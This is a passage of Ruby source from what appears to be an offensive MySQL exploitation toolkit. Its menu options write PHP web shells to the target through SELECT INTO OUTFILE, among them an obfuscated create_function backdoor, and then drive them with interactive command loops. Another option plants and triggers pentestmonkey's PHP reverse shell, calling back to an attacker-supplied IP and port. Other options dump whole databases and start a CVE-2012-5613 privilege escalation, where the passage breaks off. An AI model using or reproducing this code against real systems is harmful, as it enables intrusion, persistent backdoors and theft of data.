									resDir = "#{$results}/#{$module_required['Server']}"
									rezFile="#{resDir}/#{cmd.gsub('/', '_')}"
									Dir.mkdir(resDir) unless File.exists?(resDir)
									foofucker = File.open("#{rezFile}", "w+")
									@rez=[]
									query = @db.query("SELECT * FROM fooread;")
									query.each do |x|
										puts "#{x[0]}".white
										@rez << "#{x[0]}"
									end
									foofucker.puts "#{@rez.join("\n")}"
									foofucker.close

									query = @db.query('DROP TEMPORARY TABLE fooread;')
									query = @db.query('DROP DATABASE fooooooooooooooofucked;')
								rescue
									puts "[".light_red + "X".white + "] Oops, an error was encountered with your last request".light_red + "!".white
									puts "[".light_red + "X".white + "] Error Code: ".light_red + "#{@db.errno}".white
									puts "[".light_red + "X".white + "] Error Message: ".light_red + "#{@db.error}".white
								end#end rescue wrapper
								puts
							end
					end
				when "14"
					#################### MYSQL FILE WRITER #####################
					puts "[".light_yellow + "-".white + "] Please provide path to writable location on #{$module_required['Server']}".light_yellow + ": ".white
					rpath = gets.chomp
					puts
					puts "[".light_yellow + "-".white + "] Please provide name to use for new file ".light_yellow + "(".white + "blah".light_yellow + ".".white + "php, 1234".light_yellow + ".".white + "php, fuqu".light_yellow + ".".white + "php, etc".light_yellow + ")".white + ": ".light_yellow
					fname = gets.chomp
					puts
					puts "[".light_green + "*".white + "] Please Choose From the File Writer Options Provided Below".light_green + ":".white
					puts "[".light_green + "0".white + "] Return to Previous Menu".light_green
					puts "[".light_green + "1".white + "] Custom Code".light_green
					puts "[".light_green + "2".white + "] PHP System($_GET['foo']) Shell".light_green
					puts "[".light_green + "3".white + "] PHP Eval(Base64($_REQUEST['x'])) Shell".light_green
					puts "[".light_green + "4".white + "] PHP Passthru(Base64($_SERVER[HTTP_CMD])) Shell".light_green
					puts "[".light_green + "5".white + "] PHP Create_function(Base64($_SERVER[HTTP_CMD])) Shell".light_green
					case gets.chomp
						when "0"
							puts "[".light_red + "X".white + "] Returning to Previous Menu".light_red + "......".white
						when "1"
						#################### MYSQL FILE WRITER - CUSTOM CODE #####################
							begin
								puts "[".light_yellow + "-".white + "] lease type your code to write below ".light_yellow + "(".white + "i".light_yellow + ".".white + "e".light_yellow + ".".white + " <?php passthru($_POST[\\'cmd\\']); ?>".cyan + ")".white + ":".light_yellow
								code = gets.chomp
								puts

								puts "[".light_green + "*".white + "] Writing custom code to: ".light_green + "#{rpath}#{fname}".white
								puts "[".yellow + "-".white + "] You sure you want to write here? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "[".light_green + "*".white + "] OK, Trying to write file".light_green + ".......".white
									query = @db.query("SELECT '#{code}' INTO OUTFILE '#{rpath}#{fname}';")
									puts "[".light_green + "*".white + "] OK, should be all set if you didn't get any errors".light_green + " :)".white
								else
									puts "[".light_red + "X".white + "] OK, aborting File Write request".light_red + "............".white
									puts "[".light_red + "*".white + "] Returning to Previous Menu".light_red + "...".white
								end
								puts
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
							end #end begin/rescue wrapper
						when "2"
						#################### MYSQL FILE WRITER - SYSTEM SHELL #####################
							begin
								code = "<?error_reporting(0);print(___);system($_GET[\\'foo\\']);die;?>"
								puts "[".light_green + "*".white + "] Writing Systen($_GET['foo']) Based Shell to".light_green + ": #{rpath}#{fname}".white
								puts "[".yellow + "-".white + "] Please confirm you want to write here:".yellow + " Y".white + "/".yellow + "N".white
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "[".light_green + "*".white + "] OK, Trying to write file".light_green + ".......".white
									query = @db.query("SELECT '#{code}' INTO OUTFILE '#{rpath}#{fname}';")
									puts "[".light_green + "*".white + "] OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts "[".yellow + "-".white + "] Do you want to use shell now? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
									answer = gets.chomp
									puts
									if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
										puts "[".yellow + "-".white + "] Provide Web Path for".yellow + ": #{rpath}#{fname}".white
										wpath = gets.chomp
										url = URI.parse("#{wpath}")
										puts
										foo=0
										while foo.to_i < 1
											begin
												print "(".light_green + "cmd".white + ")> ".light_green
												cmd = gets.chomp
												payload = "#{url.path}?foo=#{cmd}"
												if "#{cmd.upcase}" == "EXIT" or "#{cmd.upcase}" == "QUIT"
													puts "[".light_red + "X".white + "] OK, Exiting CMD Shell session".light_red + "........".white
													puts "[".light_red + "*".white + "] You can come back yourself with curl".light_red + ": \ncurl -s #{wpath}?foo=<INSERT_CMD_HERE>".white
													break
												end
												http = Net::HTTP.new(url.host, url.port)
												request = Net::HTTP::Get.new("#{URI.encode(payload)}")
												response = http.request(request)
												bar = response.body
												if response.code == "200"
													if response.body =~ /___(.+)/m
														bar = response.body.split('___')
														puts "#{bar[1]}".white
													end
												end
											rescue NoMethodError => e
												puts "#{e}".light_red
											rescue SocketError => e
												puts "#{e}".light_red
											rescue Timeout::Error
												redo
											rescue Errno::ETIMEDOUT
												redo
											end
										end
									else
										puts "[".light_green + "*".white + "] OK, you can confirm yourself with curl: ".light_green + "\ncurl -s #{wpath}?foo=<INSERT_CMD_HERE>".white
									end
								else
									puts "[".light_red + "X".white + "] OK, aborting File Write request".light_red + "............".white
									puts "[".light_red + "*".white + "] Returning to Previous Menu".light_red + "...".white
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
							end #end begin/rescue wrapper
						when "3"
						#################### MYSQL FILE WRITER - EVAL SHELL #####################
							begin
								code = "<?error_reporting(0);print(___);eval(base64_decode($_REQUEST[\\'bar\\']));die;?>"
								puts "[".light_green + "*".white + "] Writing Eval(Base64($_Request['bar'])) Shell to".light_green + ": #{rpath}#{fname}".white
								puts "[".yellow + "*".white + "] Confirm you want to write here:".yellow + " Y".white + "/".light_green + "N".white
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "[".light_green + "*".white + "] OK, Trying to write file".light_green + ".......".white
									puts
									query = @db.query("SELECT '#{code}' INTO OUTFILE '#{rpath}#{fname}';")
									puts "[".light_green + "*".white + "] OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts "[".yellow + "-".white + "] Do you want to use shell now? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
									answer = gets.chomp
									puts
									if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"

										puts "[".yellow + "-".white + "] Provide Web Path for: ".yellow + "#{rpath}#{fname}".white
										wpath = gets.chomp
										url = URI.parse("#{wpath}")
										puts
										foo=0
										while "#{foo}".to_i < 1
											begin
												print "eval(".light_green + "cmd".white + ")> ".light_green
												cmd = Base64.encode64("#{gets.chomp}")
												payload = "#{url.path}?bar=#{cmd}"
												puts
												if "#{Base64.decode64(cmd).upcase}" == "EXIT" or "#{Base64.decode64(cmd).upcase}" == "QUIT"
													puts "[".light_red + "X".white + "] OK, Exiting CMD Shell session".light_red + "........".white
													puts "[".light_red + "*".white + "] You can come back yourself with curl: ".light_green + "\ncurl -s #{wpath}?bar=<BASE64_ENCODED_PHP-EVAL()_CMD_HERE>".white
													break
												end
												http = Net::HTTP.new(url.host, url.port)
												request = Net::HTTP::Get.new(URI.encode(payload))
												response = http.request(request)
												bar = response.body
												if response.code == "200"
													if response.body =~ /___(.+)/m
														puts "#{$1}".white
													end
												end
											rescue NoMethodError => e
												puts "#{e}".light_red
											rescue SocketError => e
												puts "#{e}".light_red
											rescue Timeout::Error
												redo
											rescue Errno::ETIMEDOUT
												redo
											end
										end
									else
										puts "[".light_green + "*".white + "] OK, you can confirm yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname}?x=<INSERT_BASE64_ENCODED_PHP-EVAL()_CMD_HERE>\"".white
									end
								else
									puts "[".light_red + "X".white + "] OK, aborting File Write request".light_red + "............".white
									puts "[".light_red + "*".white + "] Returning to Previous Menu".light_red + "...".white
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
							end #end begin/rescue wrapper
						when "4"
						#################### MYSQL FILE WRITER - PASSTHRU HEADER SHELL #####################
							begin
								code = '<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_CMD]));die;?>'
								puts "[".light_green + "*".white + "] Writing Passthru(Base64($_SERVER[HTTP_CMD])) Shell to: ".light_green + "#{rpath}#{fname}".white
								puts "[".yellow + "*".white + "] Confirm you want to write here:".yellow + " Y".white + "/".yellow + "N".white
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "[".light_green + "*".white + "] OK, Trying to Write Passthru(Base64($_SERVER[HTTP_CMD])) Shell to file".light_green + ".......".white
									query = @db.query("SELECT '#{code}' INTO OUTFILE '#{rpath}#{fname}';")
									puts "[".light_green + "*".white + "] OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts "[".yellow + "*".white + "] Do you want to use shell now? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
									answer = gets.chomp
									puts
									if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"

										puts "[".light_yellow + "*".white + "] Provide Web Path for".light_yellow + ": #{rpath}#{fname}".white
										wpath = gets.chomp
										puts
										url = URI.parse("#{wpath}")
										foo=0
										while "#{foo}".to_i < 1
											begin
												print "(".light_green + "cmd".white + ")> ".light_green
												cmd = Base64.encode64("#{gets.chomp}")
												puts
												if "#{Base64.decode64(cmd).upcase}" == "EXIT" or "#{Base64.decode64(cmd).upcase}" == "QUIT"
													puts "[".light_red + "X".white + "] OK, Exiting CMD Shell session".light_red + "........".white
													puts "[".light_red + "*".white + "] You can come back yourself with curl: ".light_green + "\ncurl -s #{wpath} -H \"CMD: <INSERT_BASE64_ENCODED_CMD_HERE>\"".white
													break
												end
												http = Net::HTTP.new(url.host, url.port)
												request = Net::HTTP::Get.new(url.path)
												request.add_field("Cmd", "#{cmd.chomp}")
												response = http.request(request)
												bar = response.body
												if response.code == "200"
													if response.body =~ /___(.+)/m
														puts "#{$1}".white
													end
												end
											rescue NoMethodError => e
												puts "#{e}".light_red
											rescue SocketError => e
												puts "#{e}".light_red
											rescue Timeout::Error
												redo
											rescue Errno::ETIMEDOUT
												redo
											end
										end
									else
										puts "[".light_green + "*".white + "] OK, you can confirm yourself with curl: ".light_green + "\ncurl -s #{wpath} -H \"CMD: <INSERT_BASE64_ENCODED_CMD_HERE>\"".white
									end
								else
									puts "[".light_red + "X".white + "] OK, aborting File Write request".light_red + "............".white
									puts "[".light_red + "*".white + "] Returning to Previous Menu".light_red + "...".white
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
							end #end begin/rescue wrapper
						when "5"
						#################### MYSQL FILE WRITER - CREATE_FUNCTION() HEADER SHELL #####################
							begin
								code = '<?error_reporting(0);print(___);$b=strrev(\"edoced_4\".\"6esab\");($var=create_function($var,$b($_SERVER[HTTP_CMD])))?$var():0?>'
								puts "[".light_green + "*".white + "] Writing Create_function(Base64($_SERVER[HTTP_CMD])) Shell to: ".light_green + "#{rpath}#{fname}".white
								puts "[".yellow + "*".white + "] Confirm you want to write here:".yellow + " Y".white + "/".light_green + "N".white
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "[".light_green + "*".white + "] OK, Trying to Write Create_function(Base64($_SERVER[HTTP_CMD])) Shell to file".light_green + ".......".white
									query = @db.query("SELECT '#{code}' INTO OUTFILE '#{rpath}#{fname}';")
									puts "[".light_green + "*".white + "] OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts "[".yellow + "*".white + "] Do you want to use shell now? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
									answer = gets.chomp
									puts
									if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"

										puts "[".light_yellow + "-".white + "] Provide Web Path for".light_yellow + ": #{rpath}#{fname}".white
										wpath = gets.chomp
										puts
										url = URI.parse("#{wpath}")
										foo=0
										while "#{foo}".to_i < 1
											begin
												print "(".light_green + "cmd".white + ")> ".light_green
												cmd = Base64.encode64("#{gets.chomp}")
												puts
												if "#{Base64.decode64(cmd).upcase}" == "EXIT" or "#{Base64.decode64(cmd).upcase}" == "QUIT"
													puts "[".light_red + "X".white + "] OK, Exiting CMD Shell session".light_red + "........".white
													puts "[".light_red + "*".white + "] You can come back yourself with curl: ".light_green + "\ncurl -s #{wpath} -H \"CMD: <INSERT_BASE64_ENCODED_PHP_CMD_HERE>\"".white
													break
												end
												http = Net::HTTP.new(url.host, url.port)
												request = Net::HTTP::Get.new(url.path)
												request.add_field("Cmd", "#{cmd.chomp}")
												response = http.request(request)
												bar = response.body
												if response.code == "200"
													if response.body =~ /___(.+)/m
														puts "#{$1}".white
													end
												end
											rescue NoMethodError => e
												puts "#{e}".light_red
											rescue SocketError => e
												puts "#{e}".light_red
											rescue Timeout::Error
												redo
											rescue Errno::ETIMEDOUT
												redo
											end
										end
									else
										puts "[".light_green + "*".white + "] OK, you can confirm yourself with curl: ".light_green + "\ncurl -s #{wpath} -H \"CMD: <INSERT_BASE64_ENCODED_PHP_CMD_HERE>\"".white
									end
								else
									puts "[".light_red + "X".white + "] OK, aborting File Write request".light_red + "............".white
									puts "[".light_red + "*".white + "] Returning to Previous Menu".light_red + "...".white
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
							end #end begin/rescue wrapper
						else
							cls
							puts
							puts "Oops, Didn't quite understand that one".light_red + "!".white
							puts "Returning to Previous Menu".light_red + "......".white
					end
					puts
				when "15"
					#################### MYSQL FILE WRITER II #####################
					begin
						cls
						banner
						puts
						puts "[".light_green + "*".white + "] Dropping to LOCAL FILE WRITER-II Shell, just tell it what local file to write and where".light_green + "......".white
						puts "\tLOCAL".white + "(".light_green + "path2file".white + ")".light_green + ">".white + " takes LOCAL PATH to File you want to write to server".light_green
						puts "\n\tREMOTE".white + "(".light_green + "path2file".white + ")".light_green + ">".white + " takes REMOTE PATH where you want to WRITE FILE on server".light_green
						puts
						foo=0
						while "#{foo}".to_i < 1
							begin
								print "LOCAL".white + "(".light_green + "path2file".white + ")".light_green + ">".white
								lpath = gets.chomp
								puts
								if "#{lpath.upcase}" == "EXIT" or "#{lpath.upcase}" == "QUIT"
									puts "[".light_red + "X".white + "] Exiting SQL File Writer-II Shell session".light_green + "......".white
									break
								end
								print "REMOTE".white + "(".light_green + "path2file".white + ")".light_green + ">".white
								rpath = gets.chomp
								puts
								if "#{rpath.upcase}" == "EXIT" or "#{rpath.upcase}" == "QUIT"
									puts "[".light_red + "X".white + "] Exiting SQL File Writer-II Shell session".light_green + "......".white
									break
								end

								#Read local file into temp table on temp database we create
								query = @db.query('CREATE DATABASE fooooooooooooooofuck;')
								query = @db.query('USE fooooooooooooooofuck;')
								query = @db.query("CREATE TEMPORARY TABLE foo (content LONGTEXT);")
								query = @db.query("LOAD DATA LOCAL INFILE '#{lpath}' INTO TABLE fooooooooooooooofuck.foo;")
								puts "[".light_green + "*".white + "] Checking LOCAL FILE was read to temp database".light_green + "....".white
								query = @db.query("SELECT * FROM foo;")
								query.each { |x| puts "#{x[0]}".white }
								puts "[".light_green + "*".white + "] Writing LOCAL FILE '#{lpath}' to REMOTE FILE".light_green + ": #{rpath}".white
								query = @db.query("SELECT * FROM foo INTO OUTFILE '#{rpath}';")
								puts "[".light_green + "*".white + "] All done, cleaning things up".light_green + "....".white
								query = @db.query('DROP TEMPORARY TABLE foo;')
								query = @db.query('DROP DATABASE fooooooooooooooofuck;')
								puts "[".yellow + "*".white + "] Do you want to try and write another local file? (".yellow + "Y".white + "/".yellow + "N".white + ")".yellow
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "N" or "#{answer.upcase}" == "NO"
									puts "[".light_red + "X".white + "] Exiting SQL File Writer-II Shell session".light_green + "......".white
									break
								end
							rescue
								puts "[".light_red + "X".white + "] Oops, an error was encountered with your last request".light_red + "!".white
								puts "[".light_red + "X".white + "] Error Code: ".light_red + "#{@db.errno}".white
								puts "[".light_red + "X".white + "] Error Message: ".light_red + "#{@db.error}".white
								#Make sure we are clear for next loop...
								query = @db.query('DROP TEMPORARY TABLE foo;')
								query = @db.query('DROP DATABASE fooooooooooooooofuck;')
							end#end rescue wrapper
						end#End of SQL Shell Loop
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end #end begin/rescue wrapper
				when "16"
					#################### PENTESTMONKEY'S PHP REVERSE SHELL #####################
					begin
						puts "[".light_green + "*".white + "] Preparing for PHP Reverse Shell".light_green + "......".white
						puts "REMOTE".white + "(".light_green + "path2file".white + ")".light_green + ">".white + " REMOTE Web Path where you want to write Pentestmonkey's PHP Reverse Shell".light_green
						puts "REMOTE".white + "(".light_green + "fileURL".white + ")".light_green + ">".white + " URL where you would find the FILE after writing to provided path above\n\tWe use this to actually trigger the PHP assisted install".light_green + "....".white
						puts
						puts "[".light_yellow + "?".white + "] Please provide IP to call home on".light_yellow + ": ".white
						homeIp = gets.chomp
						puts
						puts "[".light_yellow + "?".white + "] Please provide PORT to use when we call home".light_yellow + ": ".white
						homePort = gets.chomp
						puts
						foo=0
						print "REMOTE".white + "(".light_green + "path2file".white + ")".light_green + "> ".white
						rpath = gets.chomp
						puts
						print "REMOTE".white + "(".light_green + "fileURL".white + ")".light_green + "> ".white
						wpath = gets.chomp
						puts
						#PentestMonkey PHP Reverse Shell, smashed a bit but still in tact :p
						puts "[".light_green + "*".white + "] Make sure to have your listener open".light_green + ".........".white
						puts "[".light_green + "*".white + "] Creating Temporary local copy of Pentestmonkey's PHP Reverse Shell for uploading via SQL".light_green + ".....".white
						puts
						pentestmonkey_reverse = '<?php set_time_limit (0); $VERSION = \'1.0\'; $ip = "homeIp"; $port = "homePort"; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \'uname -a; w; id; /bin/sh -i\'; $daemon = 0; $debug = 0; if (function_exists(\'pcntl_fork\')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\'ERROR: Cant fork\'); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\'Error: Cant setsid()\'); exit(1); } $daemon = 1; } else { printit(\'WARNING: Failed to daemonise.  This is quite common and not fatal.\'); } chdir(\'/\'); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array( 0 => array(\'pipe\', \'r\'), 1 => array(\'pipe\', \'w\'), 2 => array(\'pipe\', \'w\') ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\'ERROR: Cant spawn shell\'); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit(\'ERROR: Shell connection terminated\'); break; } if (feof($pipes[1])) { printit(\'ERROR: Shell process terminated\'); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\'SOCK READ\'); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\'STDOUT READ\'); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\'STDERR READ\'); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {if(!$daemon) { print "$string\n"; } } ?>'
						query = @db.query("SELECT #{pentestmonkey_reverse.sub('homeIp', "#{homeIp}").sub('homePort', "#{homePort}").mysqlhex} INTO OUTFILE '#{rpath}#{fname}';")
						puts "[".light_green + "*".white + "] OK, should be all set if you didn't get any errors".light_green + " :)".white

# We could use LOCAL DATA INFILE as its more effecient BUT its more often disabled on newer versions of MySQL and MySQL client as well so will stick to original for broader use without issue....code below remains if you care to play around or something.....
						# Write to file locally so we can upload in a sec...
#						File.delete("\\tmp\\ET_phone_home.php") if File.file?("\\tmp\\ET_phone_home.php")
#						myfile = File.open('\tmp\ET_phone_home.php', "w+")
#						myfile.puts pentestmonkey_reverse
#						myfile.close
#						query = @db.query('DROP DATABASE IF EXISTS fooooooooooooooofuck;')
#						query = @db.query('CREATE DATABASE fooooooooooooooofuck;')
						# Read local PHP Reverse Shell into table and then write it back out to file
#						puts "[".light_green + "*".white + "] Creating Temp DB + Table to upload local file to".light_green + ".....".white
#						query = @db.query('USE fooooooooooooooofuck;')
#						query = @db.query("CREATE TEMPORARY TABLE foo (content LONGTEXT);")
#						query = @db.query("LOAD DATA LOCAL INFILE '\\tmp\\ET_phone_home.php' INTO TABLE fooooooooooooooofuck.foo;")
#						puts "[".light_green + "*".white + "] Dumping uploaded file content to remote path location".light_green + ".........".white
#						query = @db.query("SELECT * FROM foo INTO OUTFILE '#{rpath}';")
						# Now we activate it by requesting PHP file at remote URL location....
						puts "[".light_green + "*".white + "] Activating PHP Reverse Shell now, better have your listener open".light_green + ".........".white
						sleep 2;
						begin
							url = URI.parse("#{wpath}")
							http = Net::HTTP.new(url.host, url.port)
							request = Net::HTTP::Get.new(url.path)
							response = http.request(request)
							if response.code == "200"
								puts
								#This should have triggered our reverse shell so dont think you will see this...
								puts "[".light_green + "*".white + "] Got r00t".light_green + "?".white
								puts "[".light_green + "*".white + "] All done, hopefully you got a shell out of it! \n\tCleaning up database now".light_green + "....".white
#								query = @db.query('DROP TEMPORARY TABLE foo;')
#								query = @db.query('DROP DATABASE fooooooooooooooofuck;') 
#								File.delete("\\tmp\\ET_phone_home.php") if File.file?("\\tmp\\ET_phone_home.php")
							else
								puts "[".light_red + "X".white + "] Doesn't appear to be working unfortuanately. Can't seem to locate the remote trigger properly. Maybe try and check manually if it was written (".light_red + "#{wpath}".white + ")? Have listener ready before hand".light_red + "....".white
								puts "[".light_red + "X".white + "] Returning to previous menu".light_red + ".....".white
							end
						rescue Timeout::Error
							puts "Got r00t".light_green + "?".white
						end
						puts
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
					end #end begin/rescue wrapper
				when "17"
					#################### DUMP TABLE #####################
					puts "[".light_yellow + "?".white + "] Please provide the name of the DB the target table is in".light_yellow + ": ".white
					dbName = gets.chomp
					puts
					puts "[".light_yellow + "?".white + "] Please provide the table within ".light_green + "#{dbName}".white + " you want to dump".light_green + ": ".white
					tblName = gets.chomp
					puts
					#Results folder for our dumps....
					resDir = "#{$results}/#{$module_required['Server']}"
					Dir.mkdir(resDir) unless File.exists?(resDir)
					t = Time.now
					timez = t.strftime("%m.%d.%Y")
					puts "[".yellow + "?".white + "] Do you want to GZIP Compress the DUMP File?".yellow + " (".white + "Y".yellow + "/".white + "N".yellow + ")".white
					answer = gets.chomp
					puts
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						puts "[".light_green + "*".white + "] Dumping #{tblName} from #{dbName}, hang tight".light_green + ".....".white
						system("`which mysqldump` --host=#{$module_required['Server']} --user=#{$module_required['Username']} --password=#{$module_required['Password']} #{dbName} #{tblName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{resDir}/#{dbName}_#{tblName}_#{timez}.sql.gz")
						puts "[".light_green + "*".white + "] Table Dump Complete".light_green + "!".white
						puts "[".light_green + "*".white + "] You can view it here".light_green + ": #{resDir}/#{dbName}_#{tblName}_#{timez}.sql.gz".white
					else
						puts "[".light_green + "*".white + "] Dumping #{tblName} from #{dbName}, hang tight".light_green + ".....".white
						system("`which mysqldump` --host=#{$module_required['Server']} --user=#{$module_required['Username']} --password=#{$module_required['Password']} #{dbName} #{tblName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{resDir}/#{dbName}_#{tblName}_#{timez}.sql")
						puts "[".light_green + "*".white + "] Table Dump Complete".light_green + "!".white
						puts "[".light_green + "*".white + "] You can view it here".light_green + ": #{resDir}/#{dbName}_#{tblName}_#{timez}.sql".white
					end
					puts
				when "18"
					#################### DUMP DATABASE #####################
					puts "[".light_yellow + "?".white + "] Please provide the Name of the DB to DUMP".light_green + ": ".white
					dbName = gets.chomp
					puts
					#Results folder for our dumps....
					resDir = "#{$results}/#{$module_required['Server']}"
					Dir.mkdir(resDir) unless File.exists?(resDir)
					t = Time.now
					timez = t.strftime("%m.%d.%Y")
					puts "[".yellow + "?".white + "] Do you want to GZIP Compress the DUMP File?".yellow + " (".white + "Y".yellow + "/".white + "N".yellow + ")".white
					answer = gets.chomp
					puts
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						puts "[".light_green + "*".white + "] Dumping #{dbName}, hang tight".light_green + ".....".white
						system("`which mysqldump` --host=#{$module_required['Server']} --user=#{$module_required['Username']} --password=#{$module_required['Password']} #{dbName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{resDir}/#{dbName}_#{tblName}_#{timez}.sql.gz")
						g=1
					else
						puts "[".light_green + "*".white + "] Dumping #{dbName}, hang tight".light_green + ".....".white
						system("`which mysqldump`  --host=#{$module_required['Server']} --user=#{$module_required['Username']} --password=#{$module_required['Password']} #{dbName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{resDir}/#{dbName}_#{tblName}_#{timez}.sql")
						g=0
					end
					puts "[".light_green + "*".white + "] Database Dump Complete".light_green + "!".white
					if g.to_i == 1
						puts "[".light_green + "*".white + "] View it Here: ".light_green + "#{resDir}/#{dbName}_#{timez}.sql.gz".white
					else
						puts "[".light_green + "*".white + "] View it Here: ".light_green + "#{resDir}/#{dbName}_#{timez}.sql".white
					end
					puts
				when "19"
					#################### DUMP ALL #####################
					puts "[".light_green + "*".white + "] Available Databases".light_green + ":".white
					query = @db.query('SHOW DATABASES;')
					query.each { |x| puts "#{x[0]}".white }
					puts "[".yellow + "?".white + "] Please confirm you want to DUMP ALL Databases".yellow + ":".white + " Y".yellow + "/".white + "N".yellow
					answer = gets.chomp
					puts
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						#Results folder for our dumps....
						resDir = "#{$results}/#{$module_required['Server']}"
						Dir.mkdir(resDir) unless File.exists?(resDir)
						t = Time.now
						timez = t.strftime("%m.%d.%Y")
						puts "[".light_yellow + "?".white + "] Do you want to GZIP Compress the DUMP File?".light_yellow + " (".white + "Y".light_yellow + "/".white + "N".light_yellow + ")".white
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							query = @db.query('SHOW DATABASES;')
							query.each do |x|
								x[0] = dbName
								
								if "#{dbName.upcase}" == "MYSQL" or "#{dbName.upcase}" == "INFORMATION_SCHEMA" or "#{dbName.upcase}" == "TEST" or "#{dbName.upcase}" == "DATABASE"
									puts "[".light_green + "*".white + "] Skipping".light_green + ": #{dbName}".white
								else
									puts "[".light_green + "*".white + "] Dumping".light_green + ": #{dbName}".white
									system("`which mysqldump` --host=#{$module_required['Server']} --user=#{$module_required['Username']} --password=#{$module_required['Password']} #{dbName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{resDir}/#{dbName}_#{timez}.sql.gz")
									g=1
								end
							end
						else
							query = @db.query('SHOW DATABASES;')
							query.each do |x|
								x[0] = dbName
								if "#{dbName.to_s.upcase}" == "MYSQL" or "#{dbName.to_s.upcase}" == "INFORMATION_SCHEMA" or "#{dbName.to_s.upcase}" == "TEST" or "#{dbName.to_s.upcase}" == "DATABASE"
									puts "[".light_green + "*".white + "] Skipping".light_green + ": #{dbName}".white
								else
									puts "[".light_green + "*".white + "] Dumping".light_green + ": #{dbName}".white
									system("`which mysqldump` --host=#{$module_required['Server']} --user=#{$module_required['Username']} --password=#{$module_required['Password']} #{dbName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{resDir}/#{dbName}_#{timez}.sql")
									g=0
								end
							end
						end
						puts "[".light_green + "*".white + "] Dumping ALL Databases available, hang tight".light_green + ".....".white
						#loop through our database names.....skip the defaults which also helps avoid a stupid bug in the latest mysqldump tool which triggers when you try to use the --all-database options. Experienced on multiple versions on multiple distros so we will use this longer method but it gives us nice .sql files per database which keeps size and speed working to our advantage...kind of
						#	+> Error: Couldn't read status information for table general_log ()
						puts "[".light_green + "*".white + "] Database Dump Complete".light_green + "!".white
						puts "[".light_green + "*".white + "] View them all here".light_green + ": #{resDir}/".white
						if "#{g}".to_i == 1
							system("ls -lua #{resDir} | grep --color '.sql.gz'")
						else
							system("ls -lua #{resDir} | grep -v '.gz' | grep --color '.sql'")
						end
					else
						puts "[".light_red + "X".white + "] Returning to previous menu".light_red + ".....".white
					end
					puts
				when "21"
					#################### KINGCOPE CVE-2012-5613 MYSQL PRIV ESCALATION #####################
					puts "[".light_green + "*".white + "] Kingcope CVE-2012-5613 Linux MySQL Privilege Escalation".light_green
					if @version =~ /5.0/
						puts "[".light_green + "*".white + "] Version 5.0.x Detected, Setting up payload accordingly".light_green + ".....".white
						good=1
					elsif @version =~ /5.1/
						puts "[".light_green + "*".white + "] Version 5.1.x Detected, Setting up payload accordingly".light_green + ".....".white
						good=1
					end
					if not good.to_i == 1
						puts "[".light_red + "X".white + "] This only works on 5.0.x-5.1.x and your version doesn't appear to match either of those. Sorry, but you can't use this option as a result".light_red + ".........".white
